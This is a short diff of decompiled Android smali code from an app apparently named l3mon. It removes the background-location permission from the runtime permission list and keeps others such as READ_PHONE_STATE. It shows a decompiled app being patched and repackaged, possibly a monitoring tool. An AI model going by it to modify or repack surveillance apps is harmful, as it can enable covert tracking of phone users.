@@ -159,7 +159,7 @@
     const/16 v1, 0x17
     if-lt v0, v1, :cond_0
 
-    const/16 v0, 0xb
+    const/16 v0, 0xa
     new-array v0, v0, [Ljava/lang/String;
 
     const/4 v1, 0x0
@@ -195,16 +195,13 @@
     aput-object v2, v0, v1
 
     const/16 v1, 0x8
-    const-string v2, "android.permission.ACCESS_BACKGROUND_LOCATION"
-    aput-object v2, v0, v1
-
-    const/16 v1, 0x9
     const-string v2, "android.permission.POST_NOTIFICATIONS"
     aput-object v2, v0, v1
 
-    const/16 v1, 0xa
+    const/16 v1, 0x9
     const-string v2, "android.permission.READ_PHONE_STATE"
     aput-object v2, v0, v1
+
 
     const/16 v1, 0x539
     invoke-virtual {p0, v0, v1}, Lcom/etechd/l3mon/MainActivity;->requestPermissions([Ljava/lang/String;I)V
